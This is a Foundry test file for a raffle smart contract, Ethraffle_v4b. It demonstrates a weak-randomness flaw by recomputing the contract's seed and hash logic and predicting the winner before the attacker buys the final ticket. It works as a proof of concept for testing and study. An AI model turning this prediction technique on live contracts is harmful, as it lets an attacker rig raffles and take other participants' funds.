
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {

    Ethraffle_v4b target;

    // Redefine events to use with expectEmit
    event RaffleResult(
        uint raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );

    event TicketPurchase(
        uint raffleId,
        address contestant,
        uint number
    );

    function setUp() public {
        target = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(address coinbase, uint256 difficulty) public {
        
        // --- 1. Constraints ---
        // Ensure coinbase is a valid address for modulo operations (though 0 works, it's cleaner)
        // difficulty fits in uint256 naturally.
        vm.assume(coinbase != address(0));

        // --- 2. State Configuration ---
        uint256 totalTickets = target.totalTickets();
        uint256 pricePerTicket = target.pricePerTicket();
        
        // Fill the first 49 tickets with a dummy address
        address filler = address(0xCAFE);
        vm.deal(filler, pricePerTicket * (totalTickets - 1));
        
        vm.prank(filler);
        target.buyTickets{value: pricePerTicket * (totalTickets - 1)}();

        // Prepare the attacker (this contract) to buy the last ticket
        address attacker = address(this);
        vm.deal(attacker, pricePerTicket);

        // Apply the inferred values using Cheatcodes
        vm.coinbase(coinbase);
        vm.prevrandao(bytes32(difficulty));

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally
        // The contract uses the contestants array to pick seeds.
        // Indices 0 to 48 are held by 'filler'.
        // Index 49 will be held by 'attacker' (msg.sender).
        
        // seed1 logic: contestants[uint(uint160(block.coinbase)) % totalTickets].addr
        uint256 seed1Index = uint256(uint160(coinbase)) % totalTickets;
        address seed1 = seed1Index == 49 ? attacker : filler;

        // seed2 logic: contestants[uint(uint160(msg.sender)) % totalTickets].addr
        // msg.sender will be the attacker
        uint256 seed2Index = uint256(uint160(attacker)) % totalTickets;
        address seed2 = seed2Index == 49 ? attacker : filler;

        // seed3 logic: block.difficulty
        uint256 seed3 = difficulty;

        // Calculate hash and winner
        bytes32 randHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint256 winningNumber = uint256(randHash) % totalTickets;
        address winningAddress = winningNumber == 49 ? attacker : filler;

        // Expect the TicketPurchase event for the last ticket first
        vm.expectEmit(false, false, false, true, address(target));
        emit TicketPurchase(1, attacker, 49);

        // Expect the RaffleResult event with our predicted values
        vm.expectEmit(false, false, false, true, address(target));
        emit RaffleResult(1, winningNumber, winningAddress, seed1, seed2, seed3, randHash);

        // Execute the purchase that triggers the raffle
        target.buyTickets{value: pricePerTicket}();
    }

    // Allow receiving ETH (prize or refunds)
    receive() external payable {}

    fallback() external payable {}
}
